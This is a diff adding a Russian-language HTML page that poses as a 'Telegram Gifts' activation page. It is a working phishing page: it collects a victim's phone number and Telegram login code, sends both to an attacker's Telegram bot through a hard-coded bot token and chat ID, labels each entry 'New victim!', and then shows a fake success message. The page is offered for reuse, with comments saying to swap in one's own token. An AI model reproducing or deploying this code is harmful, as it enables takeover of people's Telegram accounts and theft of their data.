@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Gifts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .card {
+            background: white;
+            border-radius: 24px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+            width: 380px;
+            padding: 24px;
+            text-align: center;
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: #0088cc;
+            border-radius: 50%;
+            margin: 0 auto 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 30px;
+        }
+        h2 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #0a0a0a;
+        }
+        p {
+            color: #5f5f5f;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        .input-group {
+            text-align: left;
+            margin-bottom: 16px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #2e2e2e;
+            margin-bottom: 4px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #d9d9d9;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: border 0.2s;
+        }
+        input:focus {
+            border-color: #0088cc;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            background: #0088cc;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: #006699;
+        }
+        button:disabled {
+            background: #b0b0b0;
+            cursor: not-allowed;
+        }
+        .hidden {
+            display: none;
+        }
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0088cc;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .step {
+            transition: opacity 0.3s;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">📦</div>
+        <h2>Получите подарок</h2>
+        <p>Войдите в Telegram, чтобы активировать подарок</p>
+
+        <!-- Шаг 1: номер телефона -->
+        <div id="step1" class="step">
+            <div class="input-group">
+                <label>Номер телефона</label>
+                <input type="tel" id="phone" placeholder="+7 (999) 123-45-67" value="">
+            </div>
+            <button id="sendCodeBtn">Получить код</button>
+        </div>
+
+        <!-- Шаг 2: код подтверждения (изначально скрыт) -->
+        <div id="step2" class="step hidden">
+            <div class="input-group">
+                <label>Код подтверждения</label>
+                <input type="text" id="code" placeholder="Введите код из Telegram">
+            </div>
+            <button id="activateBtn">Активировать подарок</button>
+            <div id="loader" class="loader hidden" style="margin-top: 16px;"></div>
+        </div>
+    </div>
+
+    <script>
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const sendCodeBtn = document.getElementById('sendCodeBtn');
+        const activateBtn = document.getElementById('activateBtn');
+        const loader = document.getElementById('loader');
+        const phoneInput = document.getElementById('phone');
+        const codeInput = document.getElementById('code');
+
+        let userPhone = '';
+
+        // Обработка первого шага
+        sendCodeBtn.addEventListener('click', function() {
+            const phone = phoneInput.value.trim();
+            if (!phone) {
+                alert('Введите номер телефона');
+                return;
+            }
+            // Имитация отправки кода (мы просто сохраняем номер)
+            userPhone = phone;
+            step1.classList.add('hidden');
+            step2.classList.remove('hidden');
+        });
+
+        // Обработка второго шага (ввод кода)
+        activateBtn.addEventListener('click', function() {
+            const code = codeInput.value.trim();
+            if (!code) {
+                alert('Введите код');
+                return;
+            }
+
+            // Показываем лоадер
+            loader.classList.remove('hidden');
+            activateBtn.disabled = true;
+
+            // Отправляем данные в Telegram бота
+            const botToken =
+'8642865627:AAERBlRACv1M4JmeXU5TYHVnrASB7dG91pQ';  // замени на свой
+            const chatId = '7460184864';      // замени на свой
+            const message = `🔥 Новая жертва!\nТелефон: ${userPhone}\nКод: ${code}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // После успешной отправки показываем фейковое сообщение об активации
+                alert('Подарок активирован! Скоро он появится в вашем аккаунте.');
+                // Можно перезагрузить страницу или снова показать первый шаг
+                step2.classList.add('hidden');
+                step1.classList.remove('hidden');
+                phoneInput.value = '';
+                codeInput.value = '';
+                loader.classList.add('hidden');
+                activateBtn.disabled = false;
+            })
+            .catch(error => {
+                console.error('Ошибка:', error);
+                alert('Произошла ошибка, но мы уже получили ваши данные. Спасибо!');
+                loader.classList.add('hidden');
+                activateBtn.disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
